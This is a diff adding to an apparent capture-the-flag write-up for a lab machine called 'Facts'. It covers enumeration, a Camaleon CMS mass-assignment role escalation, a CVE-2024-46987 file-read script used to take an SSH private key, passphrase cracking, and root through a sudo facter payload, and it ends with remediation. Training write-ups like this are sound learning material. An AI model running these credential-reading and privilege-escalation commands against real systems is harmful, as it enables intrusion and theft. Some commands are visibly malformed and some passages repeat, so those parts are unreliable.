@@ -5,7 +5,8 @@
 | :--- | :--- | :--- | :--- | :--- |
 | **Facts** | `10.129.57.204`| Easy | Linux | **SOLVED** ✅ |
 
-<img width="688" height="187" alt="Screenshot 2026-05-13 124121" src="https://github.com/user-attachments/assets/84d43993-b09c-4184-9f53-e5aad3c974cb" />
+<img width="888" height="592" alt="Screenshot 2026-05-13 163627" src="https://github.com/user-attachments/assets/9dd74110-86b2-49d3-b290-34e222c6b975" />
+
 
 
 ## 📝 Introduction & Executive Summary
@@ -42,12 +43,171 @@ sudo nano /etc/hosts
 
 
 ### We appended a static host entry mapping 10.129.57.204 to facts.htb. Below is the verified state of the local routing file:
- <img width="1265" height="754" alt="Screenshot 2026-05-13 124408" src="https://github.com/user-attachments/assets/cc85ed35-a8ea-4ac1-ab54-5ab6b80e6d22" />
+ 
+<img width="1265" height="754" alt="Screenshot 2026-05-13 124408" src="https://github.com/user-attachments/assets/cc85ed35-a8ea-4ac1-ab54-5ab6b80e6d22" />
+
+### Directory Brute Forcing via Gobuster
+To discover hidden directories and potential entry points on the facts.htb web server, we performed a directory brute-forcing attack using Gobuster. We utilized the standard directory-list-2.3-medium.txt wordlist to map out the web structure:
+
+```bash
+gobuster dir http://facts.htb//usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt php.htm 1, txt, js, bak, sql, log, zip, tar, png, gif.jpg.jpeg.py.ps1 -4
+```
+
+<img width="1603" height="764" alt="Screenshot 2026-05-13 164346" src="https://github.com/user-attachments/assets/601d403c-8b78-4b08-8284-507a0d4fad34" />
+
+### The scan successfully enumerated several critical administrative paths, indicating the presence of a Camaleon CMS backend structure (such as /admin), which served as our primary gateway for the next phase.
+
+## 2. Weaponization & Initial Access (Foothold)
+### Analyzing the Web Application Layout
+Navigating to http://facts.htb via our browser loaded the primary landing page of the target web application, revealing tampilan trivia
+
+<img width="1715" height="909" alt="Screenshot 2026-05-13 143009" src="https://github.com/user-attachments/assets/afed9053-1b3d-41e6-bebc-054c3754b53c" />
+
+
+To explore the authenticated surface area of the web , we accessed the public registration endpoint at /admin/register and created a standard low-privileged account under the username victimuser.
+
+<img width="1715" height="909" alt="Screenshot 2026-05-13 143009" src="https://github.com/user-attachments/assets/3a353582-c17e-44be-9fcf-c714d5e999c5" />
+
+
+After logging into the backend panel, the default landing interface confirmed that our active session lacked administrative rights, hiding critical management configurations and system tools.
+
+<img width="1285" height="793" alt="Screenshot 2026-05-13 124708" src="https://github.com/user-attachments/assets/490b2f31-2ead-40ee-ae55-947f9a50b022" />
+
+
+Further inspection within the profile editor path (/admin/profile/edit) revealed that our internal database identifier was user ID 5, and our organizational group level was hardcoded as Client.
+
+<img width="1272" height="800" alt="Screenshot 2026-05-13 124905" src="https://github.com/user-attachments/assets/b22b24bb-6988-48ea-b80f-b67e71581929" />
+
+### Web Privilege Escalation via Mass Assignment
+To bypass the role assignment restrictions, we attempted to alter our user properties directly during the submission process. We triggered a profile update action while proxying our browser traffic through Burp Suite Proxy to capture the raw outbound HTTP POST request.
+
+<img width="1607" height="905" alt="Screenshot 2026-05-13 134052" src="https://github.com/user-attachments/assets/2ed23ea1-ec5d-4eab-b298-29879b1e77b0" />
+
+The captured request parameters were sent to Burp Suite Repeater for modification. By targeting a known Mass Assignment / Parameter Pollution weakness in the way the application processes form inputs, we manually appended an unvalidated role modification parameter to the end of the data payload body:
+
+
+The captured request parameters were sent to Burp Suite Repeater for modification. By targeting a known Mass Assignment / Parameter Pollution weakness in the way the application processes form inputs, we manually appended an unvalidated role modification parameter to the end of the data payload body:
+
+```plaintext
+&user%5Brole%5D=admin
+```
+
+<img width="1599" height="896" alt="Screenshot 2026-05-13 135926" src="https://github.com/user-attachments/assets/66085276-db9f-4f5c-afed-f947417a76e2" />
+
+
+The underlying Ruby on Rails model processed the injected parameter without server-side restriction, returning a successful HTTP 200 OK response.
+
+Refreshing our dashboard view confirmed that our account permissions had been successfully modified. The victimuser account now possessed full Administrator privileges, unlocking the complete CMS administration menu structure, including Contents, Media, Appearance, Plugins, and Settings.
+
+<img width="1702" height="900" alt="Screenshot 2026-05-13 140040" src="https://github.com/user-attachments/assets/f635ed0e-14be-447d-99c7-4ca743212bf8" />
+
+### Exploiting Arbitrary File Read (CVE-2024-46987)
+With elevated administrative session tokens established, we analyzed the active platform version (Version 2.9.0), which is vulnerable to an authenticated Arbitrary File Read flaw tracked under CVE-2024-46987.
+
+We fetched a public exploit script designed for this vulnerability from GitHub onto our local testing machine and verified the file structure:
+```bash
+sudo git clone https://github.com/Goultarde/CVE-2024-46987
+cd CVE-2024-46987
+ls
+```
+<img width="1919" height="1018" alt="Screenshot 2026-05-13 160019" src="https://github.com/user-attachments/assets/228fb76a-d070-4122-b564-a963781b1d08" />
+<img width="421" height="111" alt="Screenshot 2026-05-13 155736" src="https://github.com/user-attachments/assets/c421189e-a56f-4bda-9524-42d252191e9a" />
+
+
+We ran the script against the target, providing our compromised administrator credentials. To verify our arbitrary file read primitive, we first targeted the system's `/etc/passwd` file. The server processed the disclosure request, revealing valid system user accounts, notably `trivia` and `william` .
+
+```bash
+python3 CVE-2024-46987.py -u http://facts.htb -l victimuser -p Admin@12345 /etc/passwd
+```
+<img width="1124" height="604" alt="Screenshot 2026-05-13 155747" src="https://github.com/user-attachments/assets/8c890c50-03ea-4be2-941c-4af2e7eaf065" />
+
+Having validated our read capability, we shifted our focus to extracting sensitive access credentials. We successfully exfiltrated the encrypted OpenSSH private key (id_ed25519) belonging to the user trivia from their home profile storage directory:
+
+```bash
+python3 CVE-2024-46987.py -u http://facts.htb 1 victimuser -p Admin@12345 /home/trivia/.ssh/authorized_keys
+python3 CVE-2024-46987.py -u http://facts.htb -l victimuser -p Admin@12345 /home/trivia/.ssh/id_ed25519
+```
+<img width="1056" height="239" alt="Screenshot 2026-05-13 155758" src="https://github.com/user-attachments/assets/14d1b10f-252f-4001-8baf-2ef61b50913e" />
+
+
+3. Initial Shell Access & Passphrase Cracking
+We transferred the recovered private key text block into a local file named id_ed25519 on our local environment using the nano utility:
+
+```Bash
+sudo nano id_ed25519
+```
+<img width="405" height="54" alt="Screenshot 2026-05-13 155821" src="https://github.com/user-attachments/assets/5433b1e1-0aed-4278-a1bc-c23965b7c6c2" />
+
+To satisfy the strict security validation requirements of the native SSH client, we ran chmod to clear insecure global read permissions from our local key file:
+
+```bash
+chmod 600 id_ed25519
+```
+
+<img width="430" height="51" alt="Screenshot 2026-05-13 161043" src="https://github.com/user-attachments/assets/2a371ea1-57bb-4e79-98e9-f2966fba9793" />
+
+### Because the private key block was protected by a passphrase, we extracted its internal cryptographic signature using ssh2john and loaded it into John the Ripper. Running the cracker against the rockyou.txt dictionary quickly exposed the valid passphrase:
+
+<img width="873" height="210" alt="Screenshot 2026-05-13 160044" src="https://github.com/user-attachments/assets/acd43d7b-aace-4ebc-af77-19be423e3980" />
+
+
+### Recovered SSH Passphrase: dragonballz
 
 
 
+We then initiated an interactive SSH session to access our initial terminal foothold as the user trivia:
+
+```bash
+ssh -i id_ed25519 trivia@facts.htb
+```
+<img width="777" height="472" alt="Screenshot 2026-05-13 161051" src="https://github.com/user-attachments/assets/2da16842-3fc4-4286-8569-6dfb29ed7c4d" />
 
 
+### 4. Local Privilege Escalation (PrivEsc)
+### Enumerating Sudo Privileges
+Immediately after landing an active shell session, we checked our user's system privileges by running sudo -l. The configuration layout exposed a critical administrative oversight: trivia was permitted to run the system utility /usr/bin/facter as the high-privileged root user without password authentication (NOPASSWD).
+```bash
+sudo -l
+```
+
+### Exploiting Facter via External Directories
+Direct environment manipulation via variables like FACTERLIB was blocked by security controls. However, the facter binary supports parsing and running external automation scripts from custom paths using the --external-dir argument.
+
+Because any script inside that targeted path would be evaluated under root privileges, we created a customized malicious shell script payload inside the globally accessible /tmp folder. This script was programmed to copy the protected administrative root flag file and modify its permission bitmask to be world-readable:
+
+```Bash
+echo -e '#!/bin/bash\ncp /root/root.txt /tmp/root_flag.txt\nchmod 777 /tmp/root_flag.txt' > /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+```
+<img width="579" height="33" alt="Screenshot 2026-05-13 163913" src="https://github.com/user-attachments/assets/56d5a144-c566-4392-b802-92eb7c465845" />
+
+We then invoked the facter binary to execute our script file under administrative root authority:
+
+```bash
+sudo /usr/bin/facter --external-dir /tmp
+Capturing the Flags
+```
+
+The custom payload script was parsed and executed successfully by the root system process. We were then able to display the user flag from William's home folder and retrieve our final target administrative flag:
+
+``Bash
+cat /home/william/user.txt
+cat /tmp/root_flag.txt
+``
+<img width="579" height="33" alt="Screenshot 2026-05-13 163913" src="https://github.com/user-attachments/assets/2d233917-c542-4494-a03b-3f57c94d02d3" />
+
+
+
+User Flag: a9b8546a534fee6f2a9692864d63f199
+
+Root Flag: 64e29fdb53d3d63b2762a4d3393be6db
+
+### 5. Conclusion & Remediation
+Disable Mass Assignment Vulnerabilities: Adjust the Ruby on Rails controllers to use strong parameters, filtering out unauthorized request adjustments (such as dropping direct form inputs aimed at user[role]).
+
+Patch Camaleon CMS: Upgrade the local web application instance to a secure branch to fix the underlying unauthenticated arbitrary file disclosure vulnerability.
+
+Restrict Sudo Privileges: Remove loose NOPASSWD entries from the system /etc/sudoers configuration for binaries like facter that allow arbitrary script or plugin execution.
 
 
 
